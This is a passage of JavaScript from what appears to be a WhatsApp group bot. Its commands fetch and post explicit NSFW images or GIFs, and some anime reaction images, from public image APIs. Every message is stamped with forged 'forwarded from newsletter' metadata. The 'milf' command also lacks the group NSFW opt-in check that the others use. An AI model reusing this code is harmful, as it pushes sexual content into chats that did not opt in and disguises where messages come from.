                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                
            }
            break
case 'trap' :{
if (!m.isGroup) return XeonStickGroup()
if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/nsfw/${command}`)       
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'hentai-neko' :
case 'hneko' :{
if (!m.isGroup) return XeonStickGroup()
if (!AntiNsfw) return replygcxeon(mess.nsfw)
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/neko`)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'hentai-waifu' :
case 'nwaifu' :{
if (!m.isGroup) return XeonStickGroup()
if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
    waifudd = await axios.get(`https://waifu.pics/api/nsfw/waifu`)         
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'gasm':{
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()						
 waifudd = await axios.get(`https://nekos.life/api/v2/img/${command}`)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break  
case 'milf':{
if (!m.isGroup) return XeonStickGroup()
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/milf.json'))
var xeonyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:xeonyresult.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break 
case 'animespank':{
if (!m.isGroup) return XeonStickGroup()
if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
 waifudd = await axios.get(`https://nekos.life/api/v2/img/spank`)     
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'blowjob':{
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/blowjob.json'))
var xeonyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:xeonyresult.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'cuckold':{
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/cuckold.json'))
var xeonyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:xeonyresult.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'eba':{
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/eba.json'))
var xeonyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:xeonyresult.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'pussy':{
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/pussy.json'))
var xeonyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:xeonyresult.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'yuri':{
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/yuri.json'))
var xeonyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:xeonyresult.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'zettai':{
if (!m.isGroup) return XeonStickGroup()
	if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
var ahegaonsfw = JSON.parse(fs.readFileSync('./src/media/nsfw/zettai.json'))
var xeonyresult = pickRandom(ahegaonsfw)
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:xeonyresult.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
case 'gifblowjob':{
if (!m.isGroup) return XeonStickGroup()
if (!AntiNsfw) return replygcxeon(mess.nsfw)
await XeonStickWait()
  let assss = await axios.get ("https://api.waifu.pics/nsfw/blowjob")
    var bobuff = await fetchBuffer(assss.data.url)
    var bogif = await buffergif(bobuff)
    let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({video:bogif, gifPlayback:true }, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
}
break
			case 'animeawoo':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/awoo`)       
 let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}\n_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animemegumin':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/megumin`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeshinobu':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/shinobu`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehandhold':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/handhold`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehighfive':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/highfive`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animecringe':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/cringe`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animedance':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/dance`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animehappy':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/happy`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: { url:waifudd.data.url}}, { upload: XeonBotInc.waUploadToServer })
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
              "buttonParamsJson": `{\"display_text\":\"Next ➡️\",\"id\":\"${prefix+command}"}`
            }],
          }), 
          contextInfo: {
                  mentionedJid: [m.sender], 
                  forwardingScore: 999,
                  isForwarded: true,
                forwardedNewsletterMessageInfo: {
                  newsletterJid: '120363222395675670@newsletter',
                  newsletterName: ownername,
                  serverMessageId: 143
                }
                }
       })
    }
  }
}, { quoted: m })
return await XeonBotInc.relayMessage(m.chat, msgs.message, {})
                }
break
case 'animeglomp':{
await XeonStickWait()
 waifudd = await axios.get(`https://waifu.pics/api/sfw/glomp`)       
            let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: `Hi ${m.pushName}
_*Here is the result of ${command}*_`
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: botname
          }),
